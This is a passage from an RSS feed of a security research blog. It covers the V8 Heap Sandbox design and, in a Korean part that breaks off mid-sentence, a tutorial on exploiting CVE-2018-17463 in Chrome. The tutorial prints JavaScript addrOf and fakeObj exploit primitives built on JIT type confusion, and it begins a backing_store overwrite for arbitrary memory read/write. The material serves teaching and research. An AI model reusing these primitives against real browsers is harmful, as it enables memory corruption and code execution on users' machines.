flow</strong>. Like any security feature, the sandbox must keep overhead low. To achieve this, the Heap Sandbox generally follows these conceptual strategies:</p><ul><li><strong>Memory partitioning / isolation:</strong> separate the engine heap memory (and related structures) from other runtime memory (host address space, JIT code pages, etc.) so that a heap value cannot directly translate into an external executable address.</li><li><strong>Pointer encapsulation &amp; validation:</strong> encode (tag) pointer representations stored on the heap or validate pointers before they are used, preventing heap values from being mixed directly with host addresses.</li><li><strong>Restricted dereferencing / bounds checks:</strong> strictly distinguish whether a heap value is an executable code address and prevent interpreting arbitrary data as function pointers.</li></ul><p>Overall, V8&#x2019;s sandbox design focuses on protecting the rest of the process under the assumption that an attacker may be able to corrupt heap memory.</p><h2 id="2-2-Implementation"><a href="#2-2-Implementation" class="headerlink" title="2.2 Implementation"></a>2.2 Implementation</h2><p>The key idea in the sandbox design is to change how V8 dereferences addresses: instead of doing direct pointer arithmetic inside the engine, treat heap <strong>references as offsets/indices</strong>. This prevents raw heap values from becoming host addresses or executable pointers, and lets the runtime control pointer usage tightly. The high-level concept can be broken down as follows.</p><p><img src="image%206.png" alt="image.png"></p><p>This concept can be divided into &#x201C;sandbox address-space allocation / handling of pointers inside &amp; outside the sandbox / trusted space,&#x201D; and we&#x2019;ll take a closer look at each of those in detail.</p><h3 id="1-Sandbox-Address-Space"><a href="#1-Sandbox-Address-Space" class="headerlink" title="1. Sandbox Address Space"></a>1. Sandbox Address Space</h3><p>The sandbox reserves a <strong>large virtual address space</strong> that contains the memory V8 directly touches (engine heap, ArrayBuffer backing stores, Wasm memory, etc.). This space is reserved in virtual address space (potentially terabytes) and treated as the &#x201C;sandbox.&#x201D; Generous guard regions surround the sandbox to prevent out-of-bounds sandbox indices from escaping into the host address space, both logically and physically.</p><p><img src="image%207.png" alt="image.png"></p><h3 id="2-Sandboxed-Pointers-pointers-inside-the-sandbox"><a href="#2-Sandboxed-Pointers-pointers-inside-the-sandbox" class="headerlink" title="2. Sandboxed Pointers (pointers inside the sandbox )"></a>2. Sandboxed Pointers (pointers inside the sandbox )</h3><p>References inside the sandbox are represented not as raw physical addresses but as <strong>offsets from the sandbox base</strong>. A SandboxedPointer uses a fixed-width offset (for example, 40 bits) relative to the sandbox base, so even if the offset value is corrupted, the resulting address remains inside the sandbox. Security-wise this blocks arbitrary access outside the sandbox; performance-wise it&#x2019;s efficient because the sandbox base can be cached in a CPU register and offset&#x2192;address conversion on x86-64 requires only two extra instructions (and one on ARM64).</p><h3 id="3-Pointer-Tables-pointers-outside-the-sandbox"><a href="#3-Pointer-Tables-pointers-outside-the-sandbox" class="headerlink" title="3. Pointer Tables (pointers outside the sandbox )"></a>3. Pointer Tables (pointers outside the sandbox )</h3><p>Objects outside the sandbox (e.g., DOM nodes, external extension objects) are not referenced directly from within the sandbox. Instead, the sandbox stores <strong>indices into a pointer table</strong>. Sandboxed objects hold a table index rather than the external pointer itself; at runtime the sandbox resolves that index to an external pointer. This improves safety: spatial safety is enforced by bounds-checking table indices; temporal safety is improved because GC can manage and reclaim table entries. Table entries can also include <strong>type tags</strong> so that when a pointer is loaded it can be validated against an expected type &#x2014; helping prevent Type Confusion attacks.</p><p><img src="image%208.png" alt="image.png"></p><h3 id="4-Trusted-Space"><a href="#4-Trusted-Space" class="headerlink" title="4. Trusted Space"></a>4. Trusted Space</h3><p>Certain internal V8 objects (for example, bytecode arrays, deoptimization data) are difficult to protect solely with the sandbox or could be risky if mishandled. V8 therefore puts especially sensitive objects into a separate <strong>trusted heap area</strong> outside the sandbox. This trusted area has its own pointer-compression cage and is accessed from the sandbox via an indirection mechanism (e.g., a Trusted Pointer Table). As a result, even if an attacker corrupts data inside the sandbox, the chances of directly manipulating sensitive trusted objects are greatly reduced.</p><p><img src="image%209.png" alt="image.png"></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>In short, the sandbox architecture: (1) isolates the heap into a large virtual address region, (2) represents pointers inside the sandbox as safe offsets, (3) uses index-based tables for references to outside-the-sandbox objects, and (4) isolates especially sensitive objects into a trusted space. This multi-layered approach effectively blocks heap-based vulnerabilities from immediately turning into execution control compromises.</p><p><img src="image%2010.png" alt="image.png"></p><h1 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h1><p>Before the sandbox, simply overwriting a heap pointer so that a <code>TypedArray</code>&#x2019;s <code>backing_store</code> pointed at attacker-chosen memory was often enough to get arbitrary read/write (AAR/AAW) across process memory.</p><p>With the sandbox, the difficulty of Chrome exploitation increased dramatically. The most direct effect is that pointer overwrite attacks are harder: the sandbox stops simple pointer casting or ensures that a corrupted value won&#x2019;t be treated as a valid execution pointer. As a result, achieving a renderer-process RCE from a single vulnerability typically requires a <strong>sandbox escape</strong>.</p><p>But raising the difficulty only goes so far &#x2014; if you can escape the sandbox&#x2026;?</p><p><img src="image%2011.jpg" alt="image.jpg"></p><p>In the next post I&#x2019;ll cover how renderer RCE is achieved after the sandbox was introduced.</p><p>See you next time! &#x1F64C;</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p><a href="https://v8.dev/blog/sandbox">https://v8.dev/blog/sandbox</a></p><p><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/</a></p><p><a href="https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf">https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf</a></p><p><a href="https://m.blog.naver.com/funraon/223669595583">https://m.blog.naver.com/funraon/223669595583</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2018-17463/">CVE-2018-17463</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-Sandbox/">Heap Sandbox</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 4.(KR)</title>
      <link>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/kr/</link>
      <guid>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/kr/</guid>
      <pubDate>Fri, 10 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; OUYA77 &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xB4E4; &amp;#xCD94;&amp;#xC11D; &amp;#xC798; &amp;#xBCF4;&amp;#xB0B4;&amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB4E4; &#xCD94;&#xC11D; &#xC798; &#xBCF4;&#xB0B4;&#xC168;&#xB098;&#xC694;?</p><p>&#xC9C0;&#xB09C; &#xC2DC;&#xAC04;&#xC5D0; &#xBD84;&#xB7C9; &#xC870;&#xC808; &#xC2E4;&#xD328;&#xB85C; Read/Write primitive &#xB9CC; &#xC5BB;&#xACE0; &#xB05D;&#xB0AC;&#xB294;&#xB370;, &#xC774;&#xBC88; &#xC2DC;&#xAC04;&#xC5D0;&#xB294; RCE &#xAE4C;&#xC9C0; &#xD55C;&#xBC88; &#xAC00;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88; &#xD3EC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; CVE-2018-17463&#xC5D0;&#xC11C; &#xB0A8;&#xC740; exploit&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xACFC; Heap Sandbox &#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC9C0;&#xB09C; &#xAC8C;&#xC2DC;&#xAE00; &#xBCF4;&#xAE30;<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 2.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 3.</a></p></blockquote><h2 id="0-Recap"><a href="#0-Recap" class="headerlink" title="0. Recap"></a>0. Recap</h2><p>Part 3&#xC5D0;&#xC11C; Type Confusion&#xC744; &#xC774;&#xC6A9;&#xD574; &#xACB9;&#xCE58;&#xB294; &#xC18D;&#xC131; &#xC30D;&#xC744; &#xCC3E;&#xACE0; &#xD3EC;&#xC778;&#xD130; &#xAC1D;&#xCCB4;&#xAC00; double&#xB85C; &#xD574;&#xC11D;&#xB418;&#xC5B4;&#xC11C; double &#xD0C0;&#xC785;&#xC744; &#xC77D;&#xACE0; &#xC4F8; &#xB54C;, &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC774; &#xD3B8;&#xD568;&#xC744; &#xD1B5;&#xD574;&#xC11C; Read/Write Primitive&#xB97C; &#xC5BB;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>The addrOf Read Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-comment">// 1. vuln &#xD568;&#xC218; &#xB3D9;&#xC801; &#xC0DD;&#xC131; (Map &#xAC80;&#xC0AC; &#xC6B0;&#xD68C;)</span>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // p1&#xC744; Double&#xB85C; &#xC608;&#xC0C1;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C; p2&#xC778; Object &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB85C;&#xB4DC;&#xB428;</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB300;&#xC0C1; &#xAC1D;&#xCCB4;</span>    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (&#xC608;&#xC0C1; &#xD0C0;&#xC785;)</span>    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (&#xC2E4;&#xC81C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xAC12;)</span>    <span class="hljs-comment">// 2. JIT &#xCD5C;&#xC801;&#xD654; &#xBC0F; Type Confusion &#xC720;&#xB3C4;</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-comment">// &#xBC18;&#xD658; &#xAC12;&#xC774; 13.37&#xC774; &#xC544;&#xB2C8;&#xBA74; (&#xC989;, &#xC8FC;&#xC18C;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xBA74;) &#xC131;&#xACF5;</span>        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// &#xC8FC;&#xC18C; &#xBC18;&#xD658; &#xBC0F; &#xD0DC;&#xADF8; &#xC81C;&#xAC70;</span>        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><ul><li>The fakeObj Write Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res;        }    }}</code></pre><p>&#xC774;&#xC81C; &#xC8FC;&#xC18C;&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xB294; read primitive&#xC640; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xB294; write primitive&#xB97C; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8;, &#xC774;&#xB97C; exploit&#xC744; &#xC704;&#xD574; &#xC784;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(AAR/AAW) primitive&#xB85C; &#xC815;&#xAD50;&#xD558;&#xAC8C; &#xB2E4;&#xB4EC;&#xC5B4; &#xBCF4;&#xBA70; RCE&#xB97C; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-CVE-2018-17463-cont&#x2019;d-For-RCE"><a href="#1-CVE-2018-17463-cont&#x2019;d-For-RCE" class="headerlink" title="1. CVE-2018-17463 (cont&#x2019;d) - For RCE"></a>1. CVE-2018-17463 (cont&#x2019;d) - For RCE</h1><h2 id="1-1-Relative-R-W-&#x2192;-AAR-W"><a href="#1-1-Relative-R-W-&#x2192;-AAR-W" class="headerlink" title="1.1 Relative R/W &#x2192; AAR/W"></a>1.1 Relative R/W &#x2192; AAR/W</h2><h3 id="Concept"><a href="#Concept" class="headerlink" title="Concept)"></a>Concept)</h3><p>&#xD604;&#xC7AC;&#xC758; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB294; &#xB2E4;&#xB978; &#xAC1D;&#xCCB4;&#xC758; &#xC18D;&#xC131; &#xAC12;(&#xD3EC;&#xC778;&#xD130;)&#xC744; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xB370;&#xB294; &#xC720;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC81C;&#xB294; <strong>V8 &#xC5D4;&#xC9C4;&#xC758; &#xAC1D;&#xCCB4; &#xAD00;&#xB9AC; &#xBC29;&#xC2DD;</strong>&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; Type Confusion&#xC744; &#xC774;&#xC6A9;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;(e.g., <code>0x41414141</code>)&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xB354;&#xB77C;&#xB3C4;, V8&#xC740; &#xB36E;&#xC5B4;&#xC4F4; &#xADF8; &#xC8FC;&#xC18C;&#xB97C; &#xC5EC;&#xC804;&#xD788; <strong>&#xC720;&#xD6A8;&#xD55C; JavaScript &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;</strong>&#xB85C; &#xCDE8;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, &#xC6B0;&#xB9AC;&#xAC00; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xB123;&#xC744; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xC4F4;&#xB2E4; &#xD574;&#xB3C4;, V8&#xC740; &#xC774; &#xC8FC;&#xC18C;&#xB85C; &#xC774;&#xB3D9;&#xD55C; &#xB2E4;&#xC74C; &#xAC1D;&#xCCB4;&#xC758; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;(e.g., &#xC624;&#xD504;&#xC14B; 8&#xC758; <code>backing store</code> &#xD3EC;&#xC778;&#xD130;)&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC740; V8&#xC774; &#xC608;&#xC0C1;&#xD588;&#xB358; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xB97C; &#xCC3E;&#xC9C0; &#xBABB;&#xD574; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130; &#xC870;&#xC791;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC9C4;&#xC815;&#xD55C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(AAR/AAW)&#xB97C; &#xD655;&#xBCF4;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAC1D;&#xCCB4; &#xC18D;&#xC131;&#xC774; &#xC544;&#xB2C8;&#xB77C; <strong>V8&#xC774; &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC84;&#xD37C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xB0B4;&#xBD80; &#xD544;&#xB4DC;</strong>&#xB97C; &#xB36E;&#xC5B4;&#xC368;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC790;&#xC8FC; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xB3C4;&#xAD6C;&#xAC00; &#xBC14;&#xB85C; <strong><code>ArrayBuffer</code></strong> &#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>ArrayBuffer</code>&#xB294; &#xACE0;&#xC815;&#xB41C; &#xD06C;&#xAE30;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBC84;&#xD37C;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;, &#xC77C;&#xBC18; &#xAC1D;&#xCCB4;&#xC640; &#xB2EC;&#xB9AC; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xBCC0;&#xD658; &#xC5C6;&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC9C1;&#xC811; &#xB2E4;&#xB8F0; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAC1D;&#xCCB4;&#xC758; &#xB0B4;&#xBD80; &#xD544;&#xB4DC; &#xC911; &#xD558;&#xB098;&#xC778; <strong>backing_store &#xD3EC;&#xC778;&#xD130;</strong>&#xB294; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>ArrayBuffer</code>&#xC758; <code>backing_store</code>&#xB294; <code>TypedArray</code>&#xAC00; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xAE30;&#xC900;&#xC774; &#xB418;&#xBBC0;&#xB85C;, &#xC774; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC6B0;&#xB9AC;&#xAC00; &#xC774; &#xAC12;&#xC744; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xB36E;&#xC5B4;&#xC4F0;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74;, V8&#xC740; &#xC774;&#xB97C; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xB2E8;&#xC21C;&#xD788; &#xBC84;&#xD37C; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB85C; &#xAC04;&#xC8FC;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xAE30;&#xC874;&#xC758; Relative R/W&#xAC00; &#xB2E8;&#xC21C;&#xD788; &#xAC1D;&#xCCB4; &#xC811;&#xADFC; &#xB85C;&#xC9C1;&#xC744; &#xC624;&#xC791;&#xB3D9;&#xC2DC;&#xD0A4;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xC5C8;&#xB2E4;&#xBA74;, <code>backing_store</code> &#xC870;&#xC791;&#xC740; <strong>&#xC21C;&#xC218; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;(Raw Pointer)&#xB97C; &#xC9C1;&#xC811; &#xC81C;&#xC5B4;</strong>&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xBBC0;&#xB85C; &#xD6E8;&#xC52C; &#xAC15;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB9CC; <code>ArrayBuffer</code> &#xC790;&#xCCB4;&#xB85C;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC9C1;&#xC811; &#xC77D;&#xACE0; &#xC4F8; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0; <code>TypedArray</code>&#xB098; <code>DataView</code>&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xD615;&#xC2DD;(e.g., &#xBD80;&#xB3D9;&#xC18C;&#xC218;&#xC810;, 64&#xBE44;&#xD2B8; &#xC815;&#xC218; &#xB4F1;)&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC6B0;&#xB9AC;&#xB294; &#xC81C;&#xD55C;&#xC801;&#xC778; Relative R/W &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>backing_store</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0;, <code>TypedArray</code>&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xC644;&#xC804;&#xD55C; AAR/AAW &#xAD8C;&#xD55C;&#xC744; &#xD655;&#xBCF4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation)"></a>Exploitation)</h3><p>&#xADF8;&#xB7FC; &#xC774; &#xCEE8;&#xC149;&#xC744; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD604;&#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; Relative Write primitive&#xC5D0; &#xC0AC;&#xC6A9;&#xD588;&#xB358; fakeObj &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj}    ...</code></pre><p><code>fakeObj</code> primitive&#xB97C; &#xD1B5;&#xD574; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774; <code>backing store</code> &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC744;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xC77D;&#xAE30;&#xC640; &#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#xBAA8;&#xB450;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; <code>p1</code>&#xC5D0; &#xB300;&#xD574; &#xD558;&#xB098;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xAC00;&#xC9C4; &#xAC1D;&#xCCB4;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, <code>p2</code>&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xD558;&#xB098;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xAC00;&#xC9C4; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>vuln</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>p1</code> &#xAC1D;&#xCCB4;&#xC758; &#xD504;&#xB85C;&#xD37C;&#xD2F0; <code>x</code>&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB3D9;&#xC791;&#xC740; <code>p1</code>&#xC758; &#xAC1D;&#xCCB4; &#xC8FC;&#xC18C;&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD558;&#xC5EC; 